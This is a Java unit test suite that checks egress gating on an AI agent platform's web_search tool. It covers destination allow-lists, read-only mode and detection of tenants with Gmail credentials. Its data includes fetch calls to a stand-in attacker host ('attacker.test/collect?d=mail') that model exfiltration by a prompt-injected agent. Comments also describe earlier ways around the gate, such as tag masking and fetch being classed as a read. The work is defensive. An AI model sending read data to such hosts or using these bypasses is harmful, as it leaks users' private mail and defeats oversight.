package com.apimarketplace.orchestrator.tools.websearch;

import com.apimarketplace.agent.client.AgentClient;
import com.apimarketplace.agent.tools.ToolErrorCode;
import com.apimarketplace.agent.tools.ToolsProvider.ToolExecutionContext;
import com.apimarketplace.agent.tools.ToolsProvider.ToolExecutionResult;
import com.apimarketplace.interfaces.client.InterfaceClient;
import com.apimarketplace.orchestrator.config.WebSearchConfig;
import com.fasterxml.jackson.databind.ObjectMapper;
import org.junit.jupiter.api.BeforeEach;
import org.junit.jupiter.api.DisplayName;
import org.junit.jupiter.api.Nested;
import org.junit.jupiter.api.Test;
import org.junit.jupiter.api.extension.ExtendWith;
import org.mockito.Mock;
import org.mockito.junit.jupiter.MockitoExtension;
import org.springframework.test.util.ReflectionTestUtils;

import java.util.HashMap;
import java.util.List;
import java.util.Map;
import java.util.Set;

import static org.assertj.core.api.Assertions.assertThat;
import static org.mockito.ArgumentMatchers.any;
import static org.mockito.ArgumentMatchers.eq;
import static org.mockito.Mockito.lenient;
import static org.mockito.Mockito.verifyNoInteractions;

/**
 * LC-029 regression suite: {@code web_search} was the one egress path with no approval, no
 * access-mode check and no destination allow-list, so a prompt-injected agent could post
 * whatever it had read to a host of its choosing.
 *
 * <p>Pre-fix, {@code WebSearchToolsProvider.execute} called neither
 * {@code ToolAccessControl.checkWriteAccess} nor any destination check, so every assertion
 * below that expects {@code PERMISSION_DENIED} would have seen the call dispatched to the
 * module instead.
 */
@ExtendWith(MockitoExtension.class)
@DisplayName("LC-029 web_search egress gate")
class WebSearchToolsProviderEgressGateTest {

    private static final String TENANT = "tenant-1";

    @Mock private WebSearchModule searchModule;
    @Mock private WebFetchModule fetchModule;
    @Mock private BrowserAgentModule browserAgentModule;
    @Mock private InterfaceClient interfaceClient;
    @Mock private WebSearchConfig config;
    @Mock private org.springframework.data.redis.core.StringRedisTemplate redisTemplate;
    @Mock private AgentClient agentClient;
    @Mock private com.apimarketplace.credential.client.CredentialClient credentialClient;

    private WebSearchToolsProvider provider;

    @BeforeEach
    void setUp() {
        lenient().when(config.getMaxParallelFetches()).thenReturn(5);
        provider = new WebSearchToolsProvider(searchModule, fetchModule, browserAgentModule,
                interfaceClient, config, redisTemplate, new ObjectMapper(), agentClient);
    }

    private void allowHosts(String csv) {
        ReflectionTestUtils.setField(provider, "restrictedAllowedHostsRaw", csv);
    }

    private static Map<String, Object> params(Object... kv) {
        Map<String, Object> m = new HashMap<>();
        for (int i = 0; i < kv.length; i += 2) {
            m.put((String) kv[i], kv[i + 1]);
        }
        return m;
    }

    private static ToolExecutionContext ctx(Map<String, Object> credentials) {
        return new ToolExecutionContext(TENANT, credentials, Map.of(), Set.of(),
                null, null, null, null);
    }

    private static ToolExecutionContext restrictedCtx() {
        return ctx(Map.of(WebSearchToolsProvider.SENSITIVITY_CREDENTIAL_KEY, "restricted"));
    }

    private ToolExecutionResult exec(Map<String, Object> p, ToolExecutionContext c) {
        return provider.execute("web_search", p, c);
    }

    @Nested
    @DisplayName("restricted-scope destination allow-list")
    class DestinationAllowList {

        @Test
        @DisplayName("fetch to an off-list host is refused before the request leaves")
        void fetchToOffListHostIsRefused() {
            allowHosts("intranet.example.com");

            ToolExecutionResult result = exec(
                    params("action", "fetch", "url", "https://attacker.test/collect?d=mail"),
                    restrictedCtx());

            assertThat(result.success()).isFalse();
            assertThat(result.errorCode()).isEqualTo(ToolErrorCode.PERMISSION_DENIED);
            assertThat(result.error()).contains("attacker.test").contains("intranet.example.com");
            verifyNoInteractions(fetchModule);
        }

        @Test
        @DisplayName("a batch fetch is refused when ANY url in it is off-list")
        void batchFetchIsRefusedWhenOneUrlIsOffList() {
            allowHosts("intranet.example.com");

            ToolExecutionResult result = exec(
                    params("action", "fetch", "urls", List.of(
                            "https://intranet.example.com/page",
                            "https://attacker.test/collect")),
                    restrictedCtx());

            assertThat(result.success()).isFalse();
            assertThat(result.error()).contains("attacker.test");
            verifyNoInteractions(fetchModule);
        }

        @Test
        @DisplayName("with no allowed destination configured, a restricted fetch cannot run at all")
        void emptyAllowListFailsClosed() {
            allowHosts("");

            ToolExecutionResult result = exec(
                    params("action", "fetch", "url", "https://intranet.example.com/page"),
                    restrictedCtx());

            assertThat(result.success()).isFalse();
            assertThat(result.errorCode()).isEqualTo(ToolErrorCode.PERMISSION_DENIED);
            assertThat(result.error()).contains("no outbound destination");
            verifyNoInteractions(fetchModule);
        }

        @Test
        @DisplayName("agent_browse is refused outright: its navigation cannot be bounded in advance")
        void agentBrowseIsRefusedForRestrictedExecutions() {
            allowHosts("intranet.example.com");

            ToolExecutionResult result = exec(
                    params("action", "agent_browse", "task", "read the page",
                            "start_url", "https://intranet.example.com/page"),
                    restrictedCtx());

            assertThat(result.success()).isFalse();
            assertThat(result.errorCode()).isEqualTo(ToolErrorCode.PERMISSION_DENIED);
            assertThat(result.error()).contains("agent_browse is not");
            verifyNoInteractions(browserAgentModule);
        }

        @Test
        @DisplayName("a sub-domain of an allowed host is allowed, a look-alike suffix is not")
        void suffixMatchingIsAnchoredOnADot() {
            allowHosts("example.com");

            assertThat(provider.checkRestrictedScopeEgress("fetch",
                    params("url", "https://docs.example.com/a"), restrictedCtx())).isNull();
            assertThat(provider.checkRestrictedScopeEgress("fetch",
                    params("url", "https://example.com/a"), restrictedCtx())).isNull();
            assertThat(provider.checkRestrictedScopeEgress("fetch",
                    params("url", "https://notexample.com/a"), restrictedCtx()))
                    .contains("notexample.com");
        }

        @Test
        @DisplayName("a url that is not a parseable absolute URL is refused, not silently allowed")
        void unparseableUrlIsRefused() {
            allowHosts("example.com");

            assertThat(provider.checkRestrictedScopeEgress("fetch",
                    params("url", "not a url"), restrictedCtx()))
                    .contains("not a parseable absolute URL");
        }

        @Test
        @DisplayName("search is never blocked: its destination is the platform's own backend")
        void searchIsNotBlocked() {
            allowHosts("");
            assertThat(provider.checkRestrictedScopeEgress("search",
                    params("query", "anything"), restrictedCtx())).isNull();
        }

        @Test
        @DisplayName("an execution with no sensitivity tag is unaffected, tagged or namespaced is gated")
        void gateOnlyAppliesToRestrictedExecutions() {
            allowHosts("example.com");
            Map<String, Object> offList = params("url", "https://attacker.test/x");

            // untagged: today's behaviour, unchanged
            assertThat(provider.checkRestrictedScopeEgress("fetch", offList,
                    ToolExecutionContext.of(TENANT))).isNull();
            assertThat(provider.checkRestrictedScopeEgress("fetch", offList, null)).isNull();
            assertThat(provider.checkRestrictedScopeEgress("fetch", offList,
                    ctx(Map.of(WebSearchToolsProvider.SENSITIVITY_CREDENTIAL_KEY, "standard"))))
                    .isNull();

            // the namespaced credential form the agent loop emits is honoured too
            assertThat(provider.checkRestrictedScopeEgress("fetch", offList,
                    ctx(Map.of("__" + WebSearchToolsProvider.SENSITIVITY_CREDENTIAL_KEY + "__",
                            "restricted"))))
                    .contains("attacker.test");
        }

        @Test
        @DisplayName("regression: a plain NORMAL tag does not mask a namespaced RESTRICTED one")
        void plainNormalTagDoesNotMaskNamespacedRestricted() {
            allowHosts("example.com");
            // A relay that copies a plain NORMAL next to the tag every relay forwards used to win:
            // the plain key was read first and the namespaced one never consulted.
            Map<String, Object> bothKeys = Map.of(
                    WebSearchToolsProvider.SENSITIVITY_CREDENTIAL_KEY, "NORMAL",
                    "__" + WebSearchToolsProvider.SENSITIVITY_CREDENTIAL_KEY + "__", "RESTRICTED");

            assertThat(WebSearchToolsProvider.isRestrictedExecution(ctx(bothKeys))).isTrue();
            assertThat(provider.checkRestrictedScopeEgress("fetch",
                    params("url", "https://attacker.test/x"), ctx(bothKeys)))
                    .contains("attacker.test");
        }
    }

    /**
     * The half of LC-029 that was inert for three passes: the gate above only ever fired for
     * an execution carrying an explicit {@code dataSensitivity} tag, and no component anywhere
     * wrote that tag, so on every shipped path {@code checkRestrictedScopeEgress} classified
     * the execution STANDARD and returned null. These tests drive the real
     * {@code execute("web_search", ...)} entry point with NO tag at all and a tenant that holds
     * a Gmail credential, which is the shipped configuration: every denial below is dispatched
     * to the module on the pre-producer code.
     */
    @Nested
    @DisplayName("tenant-level restricted-scope detection")
    class TenantLevelDetection {

        private void tenantHolds(String... integrations) {
            lenient().when(credentialClient.getConfiguredIntegrations(TENANT))
                    .thenReturn(Set.of(integrations));
        }

        private void detection(RestrictedScopeTenantDetector.Mode mode) {
            ReflectionTestUtils.setField(provider, "restrictedScopeTenantDetector",
                    new RestrictedScopeTenantDetector(credentialClient, mode, java.time.Duration.ofSeconds(60)));
        }

        /** No sensitivity tag anywhere: exactly what every shipped caller sends. */
        private ToolExecutionContext untaggedCtx() {
            return ToolExecutionContext.of(TENANT);
        }

        @Test
        @DisplayName("agent_browse is refused for a Gmail-connected tenant with no tag on the call")
        void agentBrowseIsRefusedForARestrictedScopeTenant() {
            tenantHolds("slack", "gmail");
            detection(RestrictedScopeTenantDetector.Mode.BOUND);

            ToolExecutionResult result = exec(
                    params("action", "agent_browse", "task", "read the page"), untaggedCtx());

            assertThat(result.success()).isFalse();
            assertThat(result.errorCode()).isEqualTo(ToolErrorCode.PERMISSION_DENIED);
            assertThat(result.error()).contains("agent_browse is not");
            verifyNoInteractions(browserAgentModule);
        }

        @Test
        @DisplayName("fetch to an off-list host is refused for a Gmail-connected tenant")
        void fetchToOffListHostIsRefusedForARestrictedScopeTenant() {
            tenantHolds("gmail");
            detection(RestrictedScopeTenantDetector.Mode.BOUND);
            allowHosts("intranet.example.com");

            ToolExecutionResult result = exec(
                    params("action", "fetch", "url", "https://attacker.test/collect?d=mail"),
                    untaggedCtx());

            assertThat(result.success()).isFalse();
            assertThat(result.errorCode()).isEqualTo(ToolErrorCode.PERMISSION_DENIED);
            assertThat(result.error()).contains("attacker.test");
            verifyNoInteractions(fetchModule);
        }

        @Test
        @DisplayName("an allowed host still goes through for the same tenant")
        void allowedHostStillFetchesForARestrictedScopeTenant() {
            // The denial must be a destination bound, not a blanket block on the tenant.
            tenantHolds("gmail");
            detection(RestrictedScopeTenantDetector.Mode.BOUND);
            allowHosts("intranet.example.com");
            lenient().when(fetchModule.canHandle("fetch")).thenReturn(true);
            lenient().when(fetchModule.execute(eq("fetch"), any(), eq(TENANT), any()))
                    .thenReturn(java.util.Optional.of(ToolExecutionResult.success(Map.of("pages", List.of()))));

            ToolExecutionResult result = exec(
                    params("action", "fetch", "url", "https://intranet.example.com/page"),
                    untaggedCtx());

            assertThat(result.success()).isTrue();
        }

        @Test
        @DisplayName("mode=bound (explicit opt-in) lets fetch run while no destination is configured")
        void boundModeDoesNotBreakFetchWhenNoDestinationIsConfigured() {
            tenantHolds("gmail");
            detection(RestrictedScopeTenantDetector.Mode.BOUND);
            allowHosts("");
            lenient().when(fetchModule.canHandle("fetch")).thenReturn(true);
            lenient().when(fetchModule.execute(eq("fetch"), any(), eq(TENANT), any()))
                    .thenReturn(java.util.Optional.of(ToolExecutionResult.success(Map.of("pages", List.of()))));

            ToolExecutionResult result = exec(
                    params("action", "fetch", "url", "https://anywhere.test/page"), untaggedCtx());

            assertThat(result.success()).isTrue();
        }

        @Test
        @DisplayName("the SHIPPED default (Spring constructor, no property) refuses fetch on an empty allow-list")
        void shippedDefaultFailsClosedOnAnUnconfiguredAllowList() {
            tenantHolds("gmail");
            ReflectionTestUtils.setField(provider, "restrictedScopeTenantDetector",
                    new RestrictedScopeTenantDetector(credentialClient, (String) null));
            allowHosts("");

            ToolExecutionResult result = exec(
                    params("action", "fetch", "url", "https://anywhere.test/page"), untaggedCtx());

            assertThat(result.success()).isFalse();
            assertThat(result.errorCode()).isEqualTo(ToolErrorCode.PERMISSION_DENIED);
            verifyNoInteractions(fetchModule);
        }

        @Test
        @DisplayName("mode=strict makes an unconfigured allow-list fail closed for the same tenant")
        void strictModeFailsClosedOnAnUnconfiguredAllowList() {
            tenantHolds("gmail");
            detection(RestrictedScopeTenantDetector.Mode.STRICT);
            allowHosts("");

            ToolExecutionResult result = exec(
                    params("action", "fetch", "url", "https://anywhere.test/page"), untaggedCtx());

            assertThat(result.success()).isFalse();
            assertThat(result.errorCode()).isEqualTo(ToolErrorCode.PERMISSION_DENIED);
            assertThat(result.error()).contains("no outbound destination");
            verifyNoInteractions(fetchModule);
        }

        @Test
        @DisplayName("mode=off returns to tag-only classification, so nothing is refused")
        void offModeRestoresTagOnlyClassification() {
            tenantHolds("gmail");
            detection(RestrictedScopeTenantDetector.Mode.OFF);
            allowHosts("intranet.example.com");

            assertThat(provider.checkRestrictedScopeEgress("fetch",
                    params("url", "https://attacker.test/x"), untaggedCtx())).isNull();
            assertThat(provider.checkRestrictedScopeEgress("agent_browse",
                    params("task", "x"), untaggedCtx())).isNull();
        }

        @Test
        @DisplayName("a tenant holding no restricted-scope credential is unaffected")
        void ordinaryTenantIsUnaffected() {
            tenantHolds("slack", "notion");
            detection(RestrictedScopeTenantDetector.Mode.STRICT);
            allowHosts("");

            assertThat(provider.checkRestrictedScopeEgress("fetch",
                    params("url", "https://attacker.test/x"), untaggedCtx())).isNull();
            assertThat(provider.checkRestrictedScopeEgress("agent_browse",
                    params("task", "x"), untaggedCtx())).isNull();
        }

        @Test
        @DisplayName("search is never bounded, even for a Gmail-connected tenant in strict mode")
        void searchIsNeverBoundedForARestrictedScopeTenant() {
            tenantHolds("gmail");
            detection(RestrictedScopeTenantDetector.Mode.STRICT);
            allowHosts("");

            assertThat(provider.checkRestrictedScopeEgress("search",
                    params("query", "anything"), untaggedCtx())).isNull();
        }

        @Test
        @DisplayName("an explicit standard tag does not survive a restricted tenant")
        void explicitStandardTagDoesNotOverrideTheTenantAnswer() {
            // The tag carrier defaults to STANDARD for anything it does not recognise, so a
            // caller could otherwise disarm the tenant-level control just by sending one.
            tenantHolds("gmail");
            detection(RestrictedScopeTenantDetector.Mode.BOUND);
            allowHosts("intranet.example.com");

            assertThat(provider.checkRestrictedScopeEgress("agent_browse", params("task", "x"),
                    ctx(Map.of(WebSearchToolsProvider.SENSITIVITY_CREDENTIAL_KEY, "standard"))))
                    .contains("agent_browse is not");
        }
    }

    @Nested
    @DisplayName("read-only agent mode")
    class ReadOnlyMode {

        @Test
        @DisplayName("a read-only agent cannot drive a browser session")
        void readOnlyAgentCannotAgentBrowse() {
            ToolExecutionResult result = exec(
                    params("action", "agent_browse", "task", "do something"),
                    ctx(Map.of("web_searchAccessMode", "read")));

            assertThat(result.success()).isFalse();
            assertThat(result.errorCode()).isEqualTo(ToolErrorCode.PERMISSION_DENIED);
            assertThat(result.error()).contains("read-only");
            verifyNoInteractions(browserAgentModule);
        }

        @Test
        @DisplayName("a read-only agent cannot fetch: fetch is an egress channel, not a read")
        void readOnlyAgentCannotFetch() {
            // Pre-fix, ToolAccessControl classified web_search:fetch as READ, and
            // checkWriteAccess short-circuits on isReadAction before it ever looks at the
            // mode - so a read-only agent could put anything it had read into a URL and
            // send it out. This assertion failed on that code.
            ToolExecutionResult result = exec(
                    params("action", "fetch", "url", "https://attacker.test/collect?d=mail"),
                    ctx(Map.of("web_searchAccessMode", "read")));

            assertThat(result.success()).isFalse();
            assertThat(result.errorCode()).isEqualTo(ToolErrorCode.PERMISSION_DENIED);
            assertThat(result.error()).contains("read-only");
            verifyNoInteractions(fetchModule);
        }

        @Test
        @DisplayName("the same read-only agent can still search: search opens no channel out")
        void readOnlyAgentCanStillSearch() {
            // The denial above must not be a blanket block on the tool: search reaches the
            // platform's own backend, so it stays classified READ.
            assertThat(com.apimarketplace.agent.config.ToolAccessControl.checkWriteAccess(
                    Map.of("web_searchAccessMode", "read"), "web_search", "search"))
                    .isEmpty();
            assertThat(com.apimarketplace.agent.config.ToolAccessControl.isReadAction(
                    "web_search", "fetch")).isFalse();
        }

        @Test
        @DisplayName("a read-only agent cannot abort or steer a running session either")
        void readOnlyAgentCannotControlASession() {
            for (String action : List.of("browse_abort", "browse_intervene", "browse_screenshot")) {
                ToolExecutionResult result = exec(
                        params("action", action, "session_id", "ses_1", "hint", "x"),
                        ctx(Map.of("web_searchAccessMode", "read")));
                assertThat(result.success()).as("action %s", action).isFalse();
                assertThat(result.errorCode()).isEqualTo(ToolErrorCode.PERMISSION_DENIED);
            }
            verifyNoInteractions(browserAgentModule);
        }

        @Test
        @DisplayName("an agent with no configured mode keeps full access")
        void unsetModeIsUnrestricted() {
            assertThat(provider.execute("web_search", params("action", "help"),
                    ToolExecutionContext.of(TENANT)).success()).isTrue();
        }

        @Test
        @DisplayName("help stays callable in read-only mode and on a restricted execution")
        void helpIsNeverGated() {
            allowHosts("");
            assertThat(exec(params("action", "help"),
                    ctx(Map.of("web_searchAccessMode", "read"))).success()).isTrue();
            assertThat(exec(params("action", "help"), restrictedCtx()).success()).isTrue();
        }
    }
}
